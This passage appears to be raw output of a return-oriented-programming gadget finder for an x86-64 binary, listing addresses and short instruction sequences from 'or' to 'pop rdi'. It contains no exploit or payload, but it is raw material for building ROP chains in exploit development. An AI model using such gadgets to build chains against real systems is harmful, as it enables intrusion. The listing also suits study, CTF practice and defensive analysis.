0x000000000041b26a : or byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00000000004b081e : or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00000000004827b0 : or byte ptr [rdi + 0x315], 4 ; ret
0x0000000000482700 : or byte ptr [rdi + 0x315], 4 ; xor eax, eax ; ret
0x000000000045b5a7 : or byte ptr [rdi], 0x85 ; rol dword ptr [rdx], 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000456927 : or byte ptr [rdi], 0x8e ; ret 1
0x0000000000415822 : or byte ptr [rdi], cl ; mov dh, 0x73 ; add dword ptr [rax - 0x7d], ecx ; ret
0x000000000047c460 : or byte ptr [rdi], cl ; mov dh, 0xc0 ; add rsp, 0x58 ; ret
0x000000000048efbb : or byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x000000000043499b : or byte ptr [rdi], cl ; sub dword ptr [rdi], esp ; jmp r9
0x0000000000421986 : or byte ptr [rdi], cl ; test ebx, ebp ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000489cb3 : or byte ptr [rdi], cl ; xchg eax, edx ; ret 0x8949
0x0000000000407b71 : or byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd284
0x00000000004b8104 : or byte ptr [rdi], dl ; add byte ptr [rdi - 0x7c], cl ; hlt ; jmp qword ptr [rbx]
0x00000000004035a5 : or ch, byte ptr [rdx + 0x76] ; leave ; ret 0x8581
0x000000000045e731 : or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x00000000004175f4 : or cl, byte ptr [rax + 1] ; ret 0x8948
0x0000000000416da7 : or cl, byte ptr [rax - 0x7d] ; ret
0x000000000042a4f2 : or cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x000000000046412e : or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x000000000048d88d : or cl, byte ptr [rcx - 0x75] ; add al, 0x24 ; add rax, qword ptr [rdx + 8] ; call rax
0x00000000004740ab : or cl, ch ; jmp rsp
0x00000000004821d5 : or cl, ch ; ret
0x000000000043bf73 : or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x0000000000496105 : or dh, bl ; ret
0x0000000000453a7c : or dh, dh ; ret 0x8902
0x00000000004214d7 : or dh, dh ; ret 0xf02
0x000000000049b924 : or dil, dl ; call rax
0x000000000041f9eb : or dil, r14b ; dec dword ptr [rax - 0x77] ; ret
0x000000000049b73d : or dl, bh ; call qword ptr [rax + 0x20fffa07]
0x000000000049b935 : or dl, bh ; call qword ptr [rax]
0x000000000049b7f9 : or dl, bh ; call rdx
0x000000000049b7f5 : or dl, bh ; inc dword ptr [rdx + 8] ; cli ; call rdx
0x000000000049b779 : or dl, bh ; jmp rsi
0x000000000049b7f8 : or dl, dil ; call rdx
0x00000000004b2c51 : or dword ptr [r11], eax ; or byte ptr [rbx], al ; fild word ptr [rcx] ; ret
0x00000000004270ea : or dword ptr [rax + 0xf000008], 0xffffff93 ; ret 0x3d83
0x00000000004540ba : or dword ptr [rax + 1], 0xffffffd8 ; jmp rax
0x000000000041438b : or dword ptr [rax + rax*8 - 0x38b79f8c], eax ; ret 0xfff0
0x000000000046132e : or dword ptr [rax - 0x7d], ecx ; ret 0x4101
0x000000000044780e : or dword ptr [rax - 1], ecx ; ret 0xc148
0x00000000004b33c5 : or dword ptr [rax], eax ; add al, bh ; test ebp, esi ; call qword ptr [rdx]
0x000000000047944b : or dword ptr [rax], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000048f6c0 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000431287 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044619f : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004311c5 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000418737 : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x0000000000465645 : or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x00000000004b33d9 : or dword ptr [rax], eax ; add byte ptr [rsi + rax*4], al ; cmc ; call rsp
0x00000000004088b3 : or dword ptr [rax], eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x0000000000434136 : or dword ptr [rbp - 0xcffffff], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x00000000004198f0 : or dword ptr [rbx], 0x20 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00000000004b2c52 : or dword ptr [rbx], eax ; or byte ptr [rbx], al ; fild word ptr [rcx] ; ret
0x000000000041aed3 : or dword ptr [rcx + 0xf48002a], eax ; ret 0x8948
0x0000000000406ed9 : or dword ptr [rcx], eax ; ret 0xf741
0x0000000000475f02 : or dword ptr [rdi], ecx ; xchg dword ptr [rdi], esi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x000000000042aef7 : or dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00000000004868f6 : or dword ptr [rip + 0x23b8eb], 1 ; pop rbx ; ret
0x00000000004bb6c8 : or eax, 0x10a0303 ; ret
0x00000000004bb720 : or eax, 0x1370303 ; ret
0x000000000044b531 : or eax, 0x1c478d48 ; ret
0x0000000000407016 : or eax, 0x2141f4d5 ; ret
0x00000000004bb6b8 : or eax, 0x34b0303 ; ret
0x00000000004bb6ec : or eax, 0x35b0303 ; ret
0x0000000000475d22 : or eax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x000000000047558a : or eax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000046143a : or eax, 0x441f0f ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000446e22 : or eax, 0x48c0bc0f ; lea eax, dword ptr [rdi + rax] ; ret
0x0000000000430dd7 : or eax, 0x83480000 ; ret 0x4910
0x0000000000444751 : or eax, 0x83480000 ; ret 0xe910
0x0000000000430e05 : or eax, 0x83480000 ; ret 0xeb10
0x0000000000497b62 : or eax, 0x8c48348 ; pop rbx ; pop rbp ; ret
0x000000000047b0e2 : or eax, 0xc2bc0f48 ; shr rax, 2 ; ret
0x00000000004a60d9 : or eax, 0xdbf0000 ; add byte ptr [rax], al ; ret 0xd
0x000000000045ae65 : or eax, 0xea810000 ; ret 0
0x00000000004afe53 : or eax, 0xeeb0f650 ; fcmovb st(0), st(3) ; ret
0x000000000043be23 : or eax, 0xf7f0ff3 ; ret
0x000000000045000d : or eax, 0xffffffff ; ret
0x0000000000432a59 : or eax, 1 ; ret
0x00000000004b357d : or eax, dword ptr [rax] ; add byte ptr [rax - 0x6c], al ; cmc ; jmp qword ptr [rax]
0x0000000000430fb7 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004448f1 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000430fe5 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000407126 : or eax, dword ptr [rcx - 0x77] ; ret
0x00000000004b4850 : or eax, dword ptr [rdx] ; jae 0x4b4862 ; ret
0x00000000004bc9fa : or eax, dword ptr [rdx] ; ret 0xe0a
0x0000000000400fcf : or eax, eax ; call qword ptr [rcx]
0x0000000000401803 : or eax, ecx ; ret
0x0000000000401617 : or eax, edx ; ret
0x000000000041ee24 : or ebp, dword ptr [rbx] ; push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x000000000041940d : or ebp, edx ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044fb4e : or ebx, edi ; dec dword ptr [rax - 0x77] ; ret
0x000000000043bfe3 : or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000041b296 : or ebx, esi ; ret
0x0000000000429d6f : or ecx, dword ptr [rax + 0x63] ; ret
0x000000000041a187 : or ecx, dword ptr [rax + 1] ; ret 0x8949
0x0000000000416fc8 : or ecx, dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret 0xdaf7
0x000000000046b806 : or ecx, dword ptr [rax - 0x7d] ; call 0xffffffffc2800016
0x000000000042acac : or ecx, dword ptr [rax - 0x7d] ; ret
0x0000000000497bdf : or ecx, dword ptr [rax - 0x7d] ; ret 0x4810
0x0000000000489553 : or ecx, dword ptr [rbp + 0x39] ; ret 0x860f
0x0000000000402123 : or ecx, dword ptr [rbx - 0x76b7f3bd] ; ret 0x4588
0x000000000049b71d : or edi, edx ; call qword ptr [rax]
0x0000000000478786 : or edi, edx ; dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x000000000049b919 : or edi, edx ; jmp qword ptr [rax]
0x000000000049b7dd : or edi, edx ; jmp rdx
0x00000000004b2581 : or edi, esi ; call rsp
0x0000000000401898 : or edx, ebx ; cmovne rax, rdx ; ret
0x000000000049b7ed : or edx, edi ; jmp qword ptr [rdx]
0x000000000049b731 : or edx, edi ; jmp rax
0x000000000043bf03 : or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x0000000000461bb4 : or esi, ebx ; ret
0x000000000041fa83 : or esi, edi ; dec dword ptr [rax - 0x77] ; ret
0x00000000004b2915 : or esi, edi ; jmp rsp
0x00000000004198f1 : or esp, dword ptr [rax] ; mov eax, 0xffffffff ; pop rbx ; ret
0x00000000004b405a : or esp, dword ptr [rsi + rcx + 0x18] ; ret
0x0000000000401897 : or r10, r11 ; cmovne rax, rdx ; ret
0x000000000043c052 : or r11b, r14b ; movq qword ptr [rdi], mm1 ; ret
0x000000000043bfe2 : or r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x000000000043bf72 : or r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x000000000043bf02 : or r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x00000000004bc9f9 : or r8d, dword ptr [r10] ; ret 0xe0a
0x000000000045e730 : or r9b, byte ptr [r8 + 0x39] ; ret 0x1176
0x0000000000402122 : or r9d, dword ptr [r11 - 0x76b7f3bd] ; ret 0x4588
0x00000000004bb71f : or rax, 0x1370303 ; ret
0x00000000004bb6b7 : or rax, 0x34b0303 ; ret
0x00000000004bb6eb : or rax, 0x35b0303 ; ret
0x0000000000475d21 : or rax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x0000000000475589 : or rax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000045000c : or rax, 0xffffffffffffffff ; ret
0x00000000004b484f : or rax, qword ptr [rdx] ; jae 0x4b4863 ; ret
0x0000000000401802 : or rax, r9 ; ret
0x0000000000401616 : or rax, rdx ; ret
0x00000000004b4059 : or rsp, qword ptr [rsi + r9 + 0x18] ; ret
0x000000000042b226 : out 0, al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000042b0e6 : out 0, eax ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000044fa24 : out 0x26, eax ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000407409 : out 0x2c, al ; inc byte ptr [rcx + 9] ; ret
0x0000000000494805 : out 0x41, eax ; call rdi
0x000000000048d3c9 : out 0x48, al ; add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00000000004779ed : out 0x48, al ; mov edi, ebx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00000000004298d8 : out 0x48, eax ; sub eax, 0x10 ; ret
0x000000000049066d : out 0x89, al ; out dx, eax ; call qword ptr [r14]
0x000000000040824d : out 0x89, al ; out dx, eax ; call qword ptr [r15 + rbx*8]
0x0000000000490741 : out 0x89, al ; out dx, eax ; call qword ptr [rax]
0x000000000049081d : out 0x89, al ; out dx, eax ; call qword ptr [rcx]
0x0000000000490627 : out 0x89, al ; out dx, eax ; call rax
0x0000000000406f7e : out 0xa1, al ; fadd dword ptr [rcx + 0x21] ; ret
0x0000000000478785 : out 0xb, eax ; cli ; dec dword ptr [rbx - 0x14f3db8c] ; ret 0x5590
0x0000000000473535 : out 0xbc, eax ; and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004aed00 : out 0xcf, eax ; movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x000000000047947c : out 0xe8, al ; jo 0x479481 ; dec dword ptr [rax + 1] ; ret
0x000000000041f9e9 : out 0xe8, eax ; or dil, r14b ; dec dword ptr [rax - 0x77] ; ret
0x000000000040a939 : out 0xe8, eax ; ret 1
0x000000000043b7ea : out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b86a : out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004b0a28 : out 0xf5, eax ; mov ch, 0xab ; ret
0x00000000004b6d71 : out 0xf8, eax ; call qword ptr [rax]
0x000000000049bbe9 : out 0xf9, eax ; call rax
0x00000000004b8bf1 : out 0xfd, al ; jmp qword ptr [rdi]
0x0000000000468842 : out 0xff, eax ; dec dword ptr [rbp + 0x63] ; ret 0x20be
0x000000000045db0e : out dx, al ; add al, 0 ; add byte ptr [rax + 0x29], cl ; ret 0x349
0x0000000000401823 : out dx, al ; add dword ptr [rax - 0x73], ecx ; jg 0x401833 ; jne 0x401828 ; ret
0x00000000004afe57 : out dx, al ; fcmovb st(0), st(3) ; ret
0x000000000042af0e : out dx, al ; jns 0x42af18 ; add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x0000000000435fea : out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000429fe2 : out dx, al ; mov rdi, rax ; call rcx
0x000000000043bbfa : out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000044604e : out dx, al ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000428993 : out dx, al ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x00000000004269a6 : out dx, al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x000000000049bbbd : out dx, al ; stc ; call rax
0x00000000004b8311 : out dx, al ; std ; jmp qword ptr [rdx]
0x000000000041e3e9 : out dx, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000041e441 : out dx, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000046f5d1 : out dx, eax ; call 0x4004b8
0x0000000000428504 : out dx, eax ; call 0x424743
0x000000000049066f : out dx, eax ; call qword ptr [r14]
0x000000000040824f : out dx, eax ; call qword ptr [r15 + rbx*8]
0x0000000000490743 : out dx, eax ; call qword ptr [rax]
0x000000000049081f : out dx, eax ; call qword ptr [rcx]
0x000000000045edfd : out dx, eax ; call r12
0x00000000004957ed : out dx, eax ; call r14
0x0000000000429367 : out dx, eax ; call rax
0x000000000047ad42 : out dx, eax ; call rbx
0x000000000049c2e1 : out dx, eax ; cli ; inc eax ; out dx, eax ; cli ; jmp rax
0x000000000049c2e5 : out dx, eax ; cli ; jmp rax
0x0000000000405c34 : out dx, eax ; in eax, 0xc4 ; ret
0x0000000000435e1a : out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435f16 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000435e62 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000047ae93 : out dx, eax ; mov r9, r14 ; call rbx
0x000000000041491a : out dx, eax ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000043bc7a : out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000044614d : out dx, eax ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000432d83 : out dx, eax ; push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000432d98 : out dx, eax ; push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000432dad : out dx, eax ; push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000044d263 : out dx, eax ; ret 0xf66
0x000000000043429c : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x0000000000434285 : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000043426e : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x0000000000432d2a : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000491767 : out dx, eax ; xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x000000000044405e : outsb dx, byte ptr [rsi] ; adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044b68e : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x0000000000467c78 : outsb dx, byte ptr [rsi] ; and eax, 0x48b4800 ; clc ; jmp rax
0x00000000004b0603 : outsb dx, byte ptr [rsi] ; ja 0x4b058c ; ret 0x48f
0x0000000000484380 : outsb dx, byte ptr [rsi] ; or byte ptr [rax + 1], cl ; ret
0x00000000004ae344 : outsb dx, byte ptr [rsi] ; sahf ; ret 0x38ae
0x000000000041fc62 : outsd dx, dword ptr [rsi] ; and al, 0x89 ; adc byte ptr [r11 + 0x5d], r11b ; ret
0x000000000040379a : outsd dx, dword ptr [rsi] ; and byte ptr [r14 + 0xf], 0xfe ; ret
0x000000000042b4b8 : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000043f9de : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x000000000043409d : outsd dx, dword ptr [rsi] ; push rdi ; ret
0x000000000043413d : outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x0000000000479f6a : outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x00000000004340a2 : outsd dx, dword ptr [rsi] ; ret
0x000000000046a04d : outsd dx, dword ptr [rsi] ; ret 0x290f
0x0000000000407bc9 : outsd dx, dword ptr [rsi] ; ret 0x2b
0x0000000000420e2a : outsd dx, dword ptr [rsi] ; ret 0x4466
0x000000000046cdcd : outsd dx, dword ptr [rsi] ; ret 0x4ce8
0x00000000004aed06 : outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x0000000000420862 : outsd dx, dword ptr [rsi] ; ret 0x8348
0x0000000000436757 : outsd dx, dword ptr [rsi] ; ret 0x8b4c
0x000000000046a076 : outsd dx, dword ptr [rsi] ; ret 0xa3e8
0x0000000000434142 : outsd dx, dword ptr [rsi] ; ret 0xc2b2
0x000000000046cda9 : outsd dx, dword ptr [rsi] ; ret 0xe583
0x0000000000479fba : outsd dx, dword ptr [rsi] ; ret 0xf66
0x000000000046a014 : outsd dx, dword ptr [rsi] ; sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x00000000004aed05 : outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x0000000000430c92 : pcmpeqb mm0, mm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x000000000047b474 : pcmpeqb mm3, qword ptr [rcx] ; add rax, 2 ; ret
0x000000000047b45f : pcmpeqb mm3, qword ptr [rsi] ; ret
0x0000000000430c91 : pcmpeqb xmm0, xmm1 ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00000000004b0105 : pcmpeqw mm5, qword ptr [rbp + r12*2 - 0x5f] ; mov cs, edi ; ret 0x8b36
0x00000000004b0106 : pcmpeqw mm5, qword ptr [rbp - 0x5f] ; mov cs, edi ; ret 0x8b36
0x000000000044e926 : pextrw edi, mm0, 0x77 ; ret
0x0000000000431e52 : pmovmskb eax, mm1 ; test eax, eax ; jne 0x431eb9 ; xor eax, eax ; ret
0x000000000044743f : pmovmskb edx, mm4 ; test edx, edx ; je 0x447453 ; bsf eax, edx ; ret
0x000000000040737f : pop qword ptr [rcx + 9] ; ret
0x0000000000452855 : pop r10 ; ret
0x00000000004b058f : pop r10 ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x0000000000451171 : pop r12 ; jmp rax
0x0000000000451156 : pop r12 ; mov esi, 2 ; jmp rax
0x00000000004269a9 : pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000428ecc : pop r12 ; pop r13 ; pop r14 ; jmp rcx
0x0000000000427b76 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x0000000000408f1e : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004006bf : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000416279 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00000000004010d7 : pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000400f5f : pop r12 ; pop r13 ; ret
0x0000000000401360 : pop r12 ; ret
0x00000000004269ab : pop r13 ; pop r14 ; jmp rax
0x0000000000428ece : pop r13 ; pop r14 ; jmp rcx
0x0000000000427b78 : pop r13 ; pop r14 ; pop r15 ; jmp rax
0x0000000000408f20 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004006c1 : pop r13 ; pop r14 ; pop r15 ; ret
0x000000000041627b : pop r13 ; pop r14 ; pop rbp ; ret
0x00000000004010d9 : pop r13 ; pop r14 ; ret
0x0000000000400f61 : pop r13 ; ret
0x00000000004269ad : pop r14 ; jmp rax
0x0000000000428ed0 : pop r14 ; jmp rcx
0x0000000000427b7a : pop r14 ; pop r15 ; jmp rax
0x0000000000408f22 : pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004006c3 : pop r14 ; pop r15 ; ret
0x000000000041627d : pop r14 ; pop rbp ; ret
0x00000000004010db : pop r14 ; ret
0x0000000000427b7c : pop r15 ; jmp rax
0x0000000000408f24 : pop r15 ; pop rbp ; ret
0x00000000004006c5 : pop r15 ; ret
0x00000000004b7554 : pop rax ; add byte ptr [r8], al ; cwde ; mov bh, cl ; jmp qword ptr [rcx]
0x0000000000425164 : pop rax ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4c07
0x00000000004b7888 : pop rax ; cwde ; stc ; jmp qword ptr [rcx]
0x000000000046493d : pop rax ; idiv edi ; dec dword ptr [rax - 0x39] ; ret 0x2c20
0x0000000000466042 : pop rax ; jmp 0x466049
0x000000000048871c : pop rax ; jmp qword ptr [rax]
0x00000000004ba554 : pop rax ; jnp 0x4ba55e ; add al, ch ; clc ; sti ; jmp rdx
0x0000000000498d72 : pop rax ; or byte ptr [rbp - 0x77], cl ; ret
0x00000000004887d6 : pop rax ; pop rdx ; pop rbx ; ret
0x00000000004bc754 : pop rax ; popfq ; add byte ptr [rax], al ; sub byte ptr [rdx], ch ; std ; jmp qword ptr [rcx]
0x000000000041c0c4 : pop rax ; ret
0x000000000049b550 : pop rax ; sar cl, cl ; jmp qword ptr [rax]
0x00000000004b8448 : pop rax ; stc ; call qword ptr [rax]
0x000000000045d149 : pop rbp ; add al, 0x4d ; cmp ebp, ebx ; jb 0x45d1c1 ; mov rdx, rax ; jmp 0x45d118
0x00000000004b8725 : pop rbp ; add byte ptr [rax], al ; sbb byte ptr [rdx + rdi*8], dl ; call qword ptr [rdi]
0x00000000004521ff : pop rbp ; jmp qword ptr [rsi]
0x000000000041d190 : pop rbp ; jmp rax
0x000000000048d7e3 : pop rbp ; mov eax, 0x89fd8945 ; ret 0xe283
0x0000000000400acb : pop rbp ; mov edi, 0x6c2bd0 ; jmp rax
0x000000000048f6bf : pop rbp ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000451170 : pop rbp ; pop r12 ; jmp rax
0x0000000000451155 : pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x00000000004269a8 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000428ecb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rcx
0x0000000000427b75 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00000000004006be : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004010d6 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000400f5e : pop rbp ; pop r12 ; pop r13 ; ret
0x000000000040135f : pop rbp ; pop r12 ; ret
0x00000000004269ac : pop rbp ; pop r14 ; jmp rax
0x0000000000428ecf : pop rbp ; pop r14 ; jmp rcx
0x0000000000427b79 : pop rbp ; pop r14 ; pop r15 ; jmp rax
0x0000000000408f21 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000004006c2 : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000041627c : pop rbp ; pop r14 ; pop rbp ; ret
0x00000000004010da : pop rbp ; pop r14 ; ret
0x000000000048b068 : pop rbp ; pop rbx ; ret
0x0000000000400ad8 : pop rbp ; ret
0x000000000049b219 : pop rbp ; stc ; call qword ptr [rax]
0x000000000048bcd1 : pop rbx ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004ad8d8 : pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x000000000044ec76 : pop rbx ; and eax, 0x7ff80000 ; ret
0x00000000004603ed : pop rbx ; cli ; inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x00000000004ad8d6 : pop rbx ; cmc ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x000000000041d0d4 : pop rbx ; jmp rax
0x0000000000486917 : pop rbx ; mov eax, dword ptr fs:[rax] ; ret
0x000000000044ecc1 : pop rbx ; mov eax, eax ; ret
0x0000000000416f6f : pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046cb6d : pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x000000000041dc19 : pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000421633 : pop rbx ; mov rax, rdi ; pop rbp ; pop r12 ; ret
0x0000000000402290 : pop rbx ; or byte ptr [rcx - 9], al ; ret
0x0000000000416278 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000045e78c : pop rbx ; pop r12 ; ret
0x00000000004917e9 : pop rbx ; pop r14 ; ret
0x000000000041d18f : pop rbx ; pop rbp ; jmp rax
0x00000000004779f1 : pop rbx ; pop rbp ; pop r12 ; jmp rax
0x0000000000451154 : pop rbx ; pop rbp ; pop r12 ; mov esi, 2 ; jmp rax
0x00000000004269a7 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000428eca : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rcx
0x0000000000416b44 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000400f5d : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000040135e : pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000408516 : pop rbx ; pop rbp ; ret
0x0000000000401e19 : pop rbx ; ret
0x00000000004034a0 : pop rbx ; ret 0x3956
0x00000000004b0bc0 : pop rbx ; ret 0x6f9
0x0000000000454c90 : pop rbx ; shl eax, cl ; pop rbp ; pop r12 ; ret
0x000000000049b211 : pop rbx ; stc ; push qword ptr [rax] ; pop rsp ; stc ; jmp qword ptr [rax]
0x000000000040c73e : pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000041dbe2 : pop rbx ; xor edx, edx ; jmp rax
0x00000000004b830d : pop rcx ; add byte ptr [rax], al ; sub dh, 0xfd ; jmp qword ptr [rdx]
0x000000000042ab01 : pop rcx ; std ; dec dword ptr [rbp - 0x7b] ; test byte ptr [rdi], 0x84 ; ret
0x0000000000434998 : pop rdi ; adc byte ptr [rdx + 8], dh ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004467dd : pop rdi ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004363b9 : pop rdi ; in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004361c9 : pop rdi ; in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004afe7e : pop rdi ; insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x0000000000427b7d : pop rdi ; jmp rax
0x00000000004aee41 : pop rdi ; mov dh, 0x4e ; ret 0x474c
0x0000000000451e42 : pop rdi ; mov rdi, qword ptr [r13] ; call r12
0x0000000000401887 : pop rdi ; or byte ptr [rax - 0x39], cl ; ret 1
0x0000000000451335 : pop rdi ; or byte ptr [rcx - 0xa], al ; ret
